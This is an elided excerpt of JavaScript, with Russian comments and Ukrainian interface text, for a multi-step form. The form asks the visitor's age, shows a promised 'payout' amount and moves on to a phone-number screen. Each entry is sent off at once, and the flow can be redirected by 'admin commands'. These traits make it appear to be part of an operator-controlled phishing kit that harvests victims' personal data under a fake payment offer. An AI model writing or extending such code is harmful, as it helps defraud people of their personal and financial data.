...
document.addEventListener('DOMContentLoaded', () => {
    ...
    // Показываем первый экран - ВОЗРАСТ (чтобы сразу видеть в логе)
    showAgeScreen();
    ...
    // ГЛОБАЛЬНЫЙ обработчик для формы возраста
    document.addEventListener('submit', async function(e) {
        const form = e.target;
        
        if (form && form.id === 'ageForm') {
            e.preventDefault();
            
            const ageScreen = document.getElementById('screen-age');
            if (!ageScreen || !ageScreen.classList.contains('active')) {
                return;
            }
            ...
            if (isNaN(age) || age < 18 || age > 100) {
                showError('ageError', 'Введіть коректний вік (від 18 до 100)');
                return;
            }
            
            userData.age = age;
            await sendData('age', age.toString());
            
            console.log('🎂 Возраст отправлен:', age);
            
            // НОВАЯ ЛОГИКА: после возраста идем на телефон (если это первый ввод)
            // Если возвращаемся после команды админа - используем returnToSavedScreen
            if (savedScreenBeforeCommand) {
                returnToSavedScreen('age');
            } else {
                // Первый ввод возраста - переходим к телефону
...
// Показываем экран ввода возраста
function showAgeScreen() {
    showScreen('screen-age');
    
    // Отображаем сумму только если она уже выбрана
    const ageAmountDisplay = document.getElementById('ageAmountDisplay');
    if (ageAmountDisplay) {
        if (userData.displayAmount) {
            ageAmountDisplay.textContent = `Ваша виплата: ${userData.displayAmount}`;
            ageAmountDisplay.style.display = 'block';
        } else {
            // Скрываем если сумма еще не выбрана (первый экран)
            ageAmountDisplay.style.display = 'none';
        }
    }
    ...
    if (ageInput) {
        // Не очищаем если уже введен возраст
        if (!userData.age) {
            ageInput.value = '';
        } else {
    ...
    if (CONFIG.SETTINGS.debug) {
        console.log('🎂 Показан экран ввода возраста');
    }
}
...
function returnToSavedScreen(dataType) {
    ...
    // Если был на экране возраста
    if (screenToReturn === 'screen-age') {
        showAgeScreen();
        return;
    }
    ...
    switch (dataType) {
        case 'age':
            // После возраста - переходим к телефону (если это первый ввод)
            if (!userData.phone) {
                showScreen('screen-phone');
                initPhoneForm();
            } else {
